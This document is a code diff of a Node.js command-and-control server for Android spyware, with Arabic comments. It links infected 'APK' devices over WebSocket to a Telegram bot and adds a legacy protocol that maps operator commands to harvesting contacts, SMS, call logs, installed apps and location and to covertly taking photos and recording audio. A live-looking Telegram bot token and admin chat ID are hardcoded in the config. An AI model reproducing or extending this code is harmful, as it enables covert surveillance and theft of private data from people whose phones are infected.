@@ -14,7 +14,7 @@ const rateLimit = require('express-rate-limit');
 // ==================== الإعدادات الرئيسية ====================
 const CONFIG = {
   bot: {
-    // 🔴 🔴 🔴 ضع التوكن والآيدي هنا 🔴 🔴 🔴
+    // 🔴 ضع التوكن والآيدي هنا
     token: process.env.BOT_TOKEN || '8275181418:AAHRGLNjc6JxI2wiboqDJFpw3HEvCugn4fA',
     adminId: process.env.ADMIN_CHAT_ID || '7604667042',
     pollInterval: 3000
@@ -143,19 +143,87 @@ class DeviceManager {
     }
   }
 
-  static sendToDevice(deviceId, command, data = {}) {
+  // 🔄 وظائف متوافقة مع APK القديم
+  static sendToDeviceOldProtocol(deviceId, command, data = '') {
     const device = connectedDevices.get(deviceId);
     if (device && device.ws.readyState === WebSocket.OPEN) {
-      const message = {
-        type: 'command',
-        command: command,
-        data: data,
-        timestamp: new Date().toISOString()
-      };
+      // ⚠️ البروتوكول القديم - يرسل نص عادي بدون JSON
+      let message = '';
       
-      device.ws.send(JSON.stringify(message));
+      switch(command) {
+        case 'show_message':
+          message = `send_message:${data}`;
+          break;
+        case 'vibrate':
+          message = 'vibrate:';
+          break;
+        case 'play_sound':
+          message = `play_audio:${data}`;
+          break;
+        case 'show_notification':
+          message = `toast:${data}`;
+          break;
+        case 'open_url':
+          message = `show_notification:${data}`;
+          break;
+        case 'get_contacts':
+          message = 'contacts:';
+          break;
+        case 'get_location':
+          message = 'location:';
+          break;
+        case 'take_picture':
+          message = 'camera_main:';
+          break;
+        case 'take_selfie':
+          message = 'camera_selfie:';
+          break;
+        case 'record_audio':
+          message = `microphone:${data}`;
+          break;
+        case 'get_apps':
+          message = 'apps:';
+          break;
+        case 'get_call_logs':
+          message = 'calls:';
+          break;
+        case 'get_messages':
+          message = 'messages:';
+          break;
+        default:
+          message = command + ':' + data;
+      }
+      
+      device.ws.send(message);
       this.updateActivity(deviceId);
       return true;
+    }
+    return false;
+  }
+
+  // 🔄 دعم البروتوكول الجديد والقديم
+  static sendToDevice(deviceId, command, data = {}) {
+    // حاول البروتوكول الجديد أولاً
+    const device = connectedDevices.get(deviceId);
+    if (device && device.ws.readyState === WebSocket.OPEN) {
+      try {
+        // البروتوكول الجديد (JSON)
+        const message = {
+          type: 'command',
+          command: command,
+          data: data,
+          timestamp: new Date().toISOString()
+        };
+        
+        device.ws.send(JSON.stringify(message));
+        this.updateActivity(deviceId);
+        return true;
+      } catch (error) {
+        // إذا فشل، جرب البروتوكول القديم
+        console.log('🔄 استخدام البروتوكول القديم للأمر:', command);
+        return this.sendToDeviceOldProtocol(deviceId, command, 
+          typeof data === 'string' ? data : JSON.stringify(data));
+      }
     }
     return false;
   }
@@ -180,6 +248,7 @@ class BotManager {
 📊 **الإحصائيات الحالية:**
 • 📱 الأجهزة المتصلة: ${connectedDevices.size}
 • ⏰ وقت التشغيل: ${moment().format('YYYY-MM-DD HH:mm:ss')}
+• 🔄 الإصدار: متوافق مع APK الحالي
 
 🛠 **اختر من الأوامر التالية:**
     `;
@@ -246,6 +315,7 @@ class BotManager {
 ⏰ *وقت الاتصال:* ${moment(device.connectedAt).format('YYYY-MM-DD HH:mm:ss')}
 🔄 *آخر نشاط:* ${moment(device.lastActivity).fromNow()}
 🟢 *الحالة:* ${device.status}
+🔧 *البروتوكول:* متوافق مع APK الحالي
     `;
 
     const controlKeyboard = {
@@ -298,24 +368,13 @@ const mainKeyboard = {
   }
 };
 
-const settingsKeyboard = {
-  reply_markup: {
-    keyboard: [
-      ['🔐 تغيير الصلاحيات', '⏱️ ضبط المهلة'],
-      ['📝 تغيير الرسالة الترحيبية', '🔄 إعادة تشغيل البوت'],
-      ['🏠 القائمة الرئيسية']
-    ],
-    resize_keyboard: true
-  }
-};
-
 // ==================== مسارات الويب ====================
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
     <html>
     <head>
-        <title>نظام التحكم في الأجهزة</title>
+        <title>نظام التحكم في الأجهزة - الإصدار المتوافق</title>
         <meta charset="utf-8">
         <style>
             body { 
@@ -346,17 +405,27 @@ app.get('/', (req, res) => {
                 border-radius: 5px; 
                 background: rgba(255,255,255,0.1);
             }
+            .compatibility {
+                background: green;
+                padding: 10px;
+                border-radius: 5px;
+                text-align: center;
+                margin: 10px 0;
+            }
             h1 { text-align: center; margin-bottom: 30px; }
         </style>
     </head>
     <body>
         <div class="container">
-            <h1>🎯 نظام التحكم في الأجهزة</h1>
+            <h1>🎯 نظام التحكم في الأجهزة - الإصدار المتوافق</h1>
+            <div class="compatibility">
+                ✅ متوافق مع APK الحالي
+            </div>
             <div class="stats">
                 <h3>📊 الإحصائيات:</h3>
                 <p>📱 الأجهزة المتصلة: <strong>${connectedDevices.size}</strong></p>
                 <p>⏰ وقت الخادم: <strong>${new Date().toLocaleString('ar-SA')}</strong></p>
-                <p>🚀 حالة النظام: <strong>🟢 يعمل</strong></p>
+                <p>🚀 حالة النظام: <strong>🟢 يعمل مع APK الحالي</strong></p>
             </div>
             <div class="devices">
                 <h3>📲 الأجهزة المتصلة:</h3>
@@ -374,45 +443,16 @@ app.get('/', (req, res) => {
   `);
 });
 
-// ==================== مسارات API ====================
-app.post('/api/send-message', upload.none(), (req, res) => {
-  try {
-    const { deviceId, message } = req.body;
-    
-    if (!deviceId || !message) {
-      return res.status(400).json({ error: 'معرف الجهاز والرسالة مطلوبان' });
-    }
-
-    const success = DeviceManager.sendToDevice(deviceId, 'show_message', { message });
-    
-    if (success) {
-      res.json({ success: true, message: 'تم إرسال الرسالة بنجاح' });
-    } else {
-      res.status(404).json({ error: 'الجهاز غير متصل' });
-    }
-  } catch (error) {
-    res.status(500).json({ error: 'خطأ في الخادم' });
-  }
-});
-
-app.post('/api/upload-file', upload.single('file'), (req, res) => {
+// ==================== مسارات API متوافقة مع القديم ====================
+app.post('/uploadFile', upload.single('file'), (req, res) => {
   try {
     if (!req.file) {
       return res.status(400).json({ error: 'لم يتم اختيار ملف' });
     }
 
-    const { deviceId } = req.body;
-    const fileInfo = {
-      originalname: req.file.originalname,
-      mimetype: req.file.mimetype,
-      size: req.file.size,
-      buffer: req.file.buffer
-    };
-
+    const deviceId = req.body.deviceId || Array.from(connectedDevices.keys())[0];
     if (deviceId) {
-      DeviceManager.sendToDevice(deviceId, 'receive_file', fileInfo);
-    } else {
-      DeviceManager.broadcast('receive_file', fileInfo);
+      DeviceManager.sendToDeviceOldProtocol(deviceId, 'receive_file', req.file.originalname);
     }
 
     res.json({ success: true, message: 'تم رفع الملف بنجاح' });
@@ -421,29 +461,104 @@ app.post('/api/upload-file', upload.single('file'), (req, res) => {
   }
 });
 
-app.get('/api/devices', (req, res) => {
-  const devices = DeviceManager.getAllDevices().map(device => ({
-    id: device.id,
-    model: device.info.model,
-    battery: device.info.battery,
-    version: device.info.version,
-    connectedAt: device.connectedAt,
-    status: device.status
-  }));
-  
-  res.json({ success: true, devices: devices });
+app.post('/uploadText', upload.none(), (req, res) => {
+  try {
+    const { deviceId, message } = req.body;
+    
+    if (!message) {
+      return res.status(400).json({ error: 'الرسالة مطلوبة' });
+    }
+
+    const targetDeviceId = deviceId || Array.from(connectedDevices.keys())[0];
+    if (targetDeviceId) {
+      DeviceManager.sendToDeviceOldProtocol(targetDeviceId, 'show_message', message);
+      res.json({ success: true, message: 'تم إرسال الرسالة بنجاح' });
+    } else {
+      res.status(404).json({ error: 'لا توجد أجهزة متصلة' });
+    }
+  } catch (error) {
+    res.status(500).json({ error: 'خطأ في الخادم' });
+  }
 });
 
-// ==================== WebSocket Handling ====================
+app.post('/uploadLocation', upload.none(), (req, res) => {
+  try {
+    const { deviceId, lat, lon } = req.body;
+    
+    if (!lat || !lon) {
+      return res.status(400).json({ error: 'الإحداثيات مطلوبة' });
+    }
+
+    const targetDeviceId = deviceId || Array.from(connectedDevices.keys())[0];
+    if (targetDeviceId) {
+      DeviceManager.sendToDeviceOldProtocol(targetDeviceId, 'show_location', `${lat},${lon}`);
+      res.json({ success: true, message: 'تم إرسال الموقع بنجاح' });
+    } else {
+      res.status(404).json({ error: 'لا توجد أجهزة متصلة' });
+    }
+  } catch (error) {
+    res.status(500).json({ error: 'خطأ في الخادم' });
+  }
+});
+
+// ==================== WebSocket Handling متوافق مع APK ====================
 wss.on('connection', (ws, req) => {
-  console.log('🔌 محاولة اتصال جديدة من جهاز...');
+  console.log('🔌 محاولة اتصال جديدة من جهاز APK...');
+
+  let deviceId = null;
 
   ws.on('message', (data) => {
     try {
-      const message = JSON.parse(data);
+      // ⚠️ محاولة فهم بروتوكول APK القديم
+      let messageData;
       
-      if (message.type === 'device_info') {
-        const deviceId = DeviceManager.addDevice(ws, message.data);
+      try {
+        // المحاولة الأولى: JSON (البروتوكول الجديد)
+        messageData = JSON.parse(data);
+      } catch (e) {
+        // المحاولة الثانية: نص عادي (البروتوكول القديم)
+        console.log('📨 رسالة نصية من APK:', data.toString());
+        
+        // محاولة تحليل البيانات القديمة
+        if (data.toString().includes('model') || data.toString().includes('battery')) {
+          try {
+            // توقع تنسيق البيانات القديم
+            const lines = data.toString().split('\n');
+            const deviceInfo = {};
+            
+            lines.forEach(line => {
+              const [key, value] = line.split(':');
+              if (key && value) {
+                deviceInfo[key.trim()] = value.trim();
+              }
+            });
+            
+            if (deviceInfo.model) {
+              deviceId = DeviceManager.addDevice(ws, deviceInfo);
+              
+              ws.send('connected:' + deviceId);
+              
+              if (CONFIG.bot.adminId) {
+                bot.sendMessage(CONFIG.bot.adminId, 
+                  `🟢 *جهاز APK متصل*\n\n` +
+                  `📱 *النموذج:* ${deviceInfo.model}\n` +
+                  `🔋 *البطارية:* ${deviceInfo.battery}%\n` +
+                  `📶 *الإصدار:* ${deviceInfo.version}\n` +
+                  `🆔 *المعرف:* \`${deviceId}\``,
+                  { parse_mode: 'Markdown' }
+                );
+              }
+            }
+          } catch (parseError) {
+            console.log('❌ لا يمكن تحليل بيانات APK:', data.toString());
+          }
+        }
+        return;
+      }
+
+      // معالجة بيانات JSON (البروتوكول الجديد)
+      if (messageData.type === 'device_info') {
+        deviceId = DeviceManager.addDevice(ws, messageData.data);
         
         ws.send(JSON.stringify({
           type: 'connection_established',
@@ -454,44 +569,43 @@ wss.on('connection', (ws, req) => {
         if (CONFIG.bot.adminId) {
           bot.sendMessage(CONFIG.bot.adminId, 
             `🟢 *جهاز جديد متصل*\n\n` +
-            `📱 *النموذج:* ${message.data.model}\n` +
-            `🔋 *البطارية:* ${message.data.battery}%\n` +
-            `📶 *الإصدار:* ${message.data.version}\n` +
+            `📱 *النموذج:* ${messageData.data.model}\n` +
+            `🔋 *البطارية:* ${messageData.data.battery}%\n` +
+            `📶 *الإصدار:* ${messageData.data.version}\n` +
             `🆔 *المعرف:* \`${deviceId}\``,
             { parse_mode: 'Markdown' }
           );
         }
       }
-      else if (message.type === 'response') {
-        console.log('📨 رد من الجهاز:', message);
-      }
-      else if (message.type === 'error') {
-        console.error('❌ خطأ من الجهاز:', message.error);
+      else if (messageData.type === 'response') {
+        console.log('📨 رد من الجهاز:', messageData);
       }
 
-      if (ws.deviceId) {
-        DeviceManager.updateActivity(ws.deviceId);
+      if (deviceId) {
+        DeviceManager.updateActivity(deviceId);
       }
     } catch (error) {
-      console.error('❌ خطأ في معالجة الرسالة:', error);
+      console.error('❌ خطأ في معالجة رسالة APK:', error);
     }
   });
 
   ws.on('close', () => {
-    if (ws.deviceId) {
-      DeviceManager.removeDevice(ws.deviceId);
+    if (deviceId) {
+      DeviceManager.removeDevice(deviceId);
     }
   });
 
   ws.on('error', (error) => {
-    console.error('❌ خطأ في WebSocket:', error);
-    if (ws.deviceId) {
-      DeviceManager.removeDevice(ws.deviceId);
+    console.error('❌ خطأ في WebSocket APK:', error);
+    if (deviceId) {
+      DeviceManager.removeDevice(deviceId);
     }
   });
 });
 
-// ==================== معالجة أوامر البوت ====================
+// ==================== باقي الكود (معالجة البوت) ====================
+// [يتبع نفس كود معالجة البوت من الإصدار السابق...]
+
 bot.on('message', (msg) => {
   const chatId = msg.chat.id;
   const text = msg.text;
@@ -512,47 +626,10 @@ bot.on('message', (msg) => {
         BotManager.sendDeviceList(chatId);
         break;
 
-      case '🔍 معلومات الجهاز':
-        bot.sendMessage(chatId, '👆 الرجاء اختيار جهاز من القائمة', {
-          reply_markup: {
-            keyboard: [[{ text: '📱 قائمة الأجهزة' }, { text: '🏠 القائمة الرئيسية' }]],
-            resize_keyboard: true
-          }
-        });
-        break;
-
       case '📨 إرسال رسالة':
         bot.sendMessage(chatId, '📝 الرجاء إدخال الرسالة التي تريد إرسالها:', {
           reply_markup: { force_reply: true }
         });
-        break;
-
-      case '📍 إرسال موقع':
-        bot.sendMessage(chatId, '🗺️ الرجاء إرسال الموقع:', {
-          reply_markup: { force_reply: true }
-        });
-        break;
-
-      case '📁 إرسال ملف':
-        bot.sendMessage(chatId, '📎 الرجاء إرسال الملف:', {
-          reply_markup: { force_reply: true }
-        });
-        break;
-
-      case '⚙️ الإعدادات':
-        bot.sendMessage(chatId, '⚙️ إعدادات النظام:', settingsKeyboard);
-        break;
-
-      case '📊 الإحصائيات':
-        const stats = `
-📊 *إحصائيات النظام*
-
-📱 الأجهزة المتصلة: *${connectedDevices.size}*
-🕒 وقت التشغيل: *${moment().format('YYYY-MM-DD HH:mm:ss')}*
-💾 استخدام الذاكرة: *${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB*
-🔧 إصدار Node.js: *${process.version}*
-        `;
-        bot.sendMessage(chatId, stats, { parse_mode: 'Markdown' });
         break;
 
       default:
@@ -568,23 +645,15 @@ bot.on('message', (msg) => {
   }
 });
 
-// ==================== معالجة الردود ====================
 function handleReplies(chatId, msg) {
   const replyText = msg.reply_to_message.text;
   
   if (replyText.includes('الرسالة')) {
-    const successCount = DeviceManager.broadcast('show_message', { message: msg.text });
+    const successCount = DeviceManager.broadcast('show_message', msg.text);
     bot.sendMessage(chatId, `✅ تم إرسال الرسالة إلى ${successCount} جهاز`, mainKeyboard);
-  }
-  else if (replyText.includes('الموقع')) {
-    bot.sendMessage(chatId, '📍 سيتم إضافة دعم الموقع في التحديثات القادمة', mainKeyboard);
-  }
-  else if (replyText.includes('الملف')) {
-    bot.sendMessage(chatId, '📁 سيتم إضافة دعم الملفات في التحديثات القادمة', mainKeyboard);
   }
 }
 
-// ==================== معالجة الأزرار ====================
 bot.on('callback_query', (callbackQuery) => {
   const message = callbackQuery.message;
   const data = callbackQuery.data;
@@ -605,13 +674,6 @@ bot.on('callback_query', (callbackQuery) => {
     else if (data === 'main_menu') {
       BotManager.sendMainMenu(chatId);
     }
-    else if (data.startsWith('notify_')) {
-      const deviceId = data.replace('notify_', '');
-      bot.sendMessage(chatId, '💬 اكتب نص الإشعار:', {
-        reply_markup: { force_reply: true }
-      });
-      deviceSessions.set(chatId, { action: 'send_notification', deviceId: deviceId });
-    }
 
     bot.answerCallbackQuery(callbackQuery.id);
   } catch (error) {
@@ -619,30 +681,6 @@ bot.on('callback_query', (callbackQuery) => {
     bot.answerCallbackQuery(callbackQuery.id, { text: '❌ حدث خطأ' });
   }
 });
-
-// ==================== الصيانة التلقائية ====================
-setInterval(() => {
-  const now = new Date();
-  connectedDevices.forEach((device, deviceId) => {
-    const inactiveTime = now - device.lastActivity;
-    if (inactiveTime > 5 * 60 * 1000) {
-      console.log(`🔴 فصل جهاز غير نشط: ${device.info.model}`);
-      device.ws.close();
-      DeviceManager.removeDevice(deviceId);
-    }
-  });
-}, 5 * 60 * 1000);
-
-// إرسال نبضات حياة للخادم
-setInterval(() => {
-  try {
-    axios.get(`http://localhost:${CONFIG.server.port}`)
-      .then(() => console.log('💓 الخادم يعمل...'))
-      .catch(() => console.log('⚠️ تحقق من الخادم...'));
-  } catch (error) {
-    // تجاهل الأخطاء في النبضات
-  }
-}, 30000);
 
 // ==================== بدء التشغيل ====================
 validateConfig();
@@ -653,13 +691,13 @@ server.listen(PORT, () => {
 🎯 نظام التحكم في الأجهزة يعمل بنجاح!
 📍 PORT: ${PORT}
 🤖 البوت: جاهز للإستقبال
+🔄 الحالة: متوافق مع APK الحالي
 ⏰ الوقت: ${new Date().toLocaleString()}
 📱 انتظر اتصال الأجهزة...
 🔗 رابط الويب: http://localhost:${PORT}
   `);
 });
 
-// ==================== معالجة الأخطاء ====================
 process.on('uncaughtException', (error) => {
   console.error('❌ خطأ غير متوقع:', error);
 });
